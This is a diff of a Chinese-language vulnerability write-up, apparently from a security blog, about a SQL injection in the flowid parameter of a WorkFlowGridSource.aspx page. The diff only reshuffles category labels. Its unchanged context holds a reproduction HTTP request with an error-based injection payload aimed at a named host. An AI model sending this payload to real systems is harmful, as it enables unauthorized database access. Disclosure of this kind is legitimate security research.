@@ -34,17 +34,9 @@ protected void Page_Load(object sender, EventArgs e)
       this.Response.Write(this.GetWorkFlowSteps(this.strWorkFlowID));
 ```
 
-深入探索
-
-计算机安全指南
-
-网络安全咨询
-
-安全工具下载
-
 主要就是根据`handle`参数的值来进行处理不同的分支逻辑
 
-SQL注入检测
+编程
 
 当**`handle=steplist`**且`flowid`必须存在时，进入`GetWorkFlowSteps`方法
 
@@ -59,6 +51,14 @@ SQL注入检测
 
 # 漏洞复现
 
+深入探索
+
+数据管理
+
+网络
+
+软件
+
 ```
 GET /WorkFlow/WorkFlowGridSource.aspx?handle=steplist&flowid='-1/user-- HTTP/1.1
 Host: dongsheng.mrxn.net
@@ -68,4 +68,4 @@ Host: dongsheng.mrxn.net
 
 通过[报错注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "标签：报错注入")在响应里回显数据库版本信息。
 
-孚盟云漏洞
+网络安全
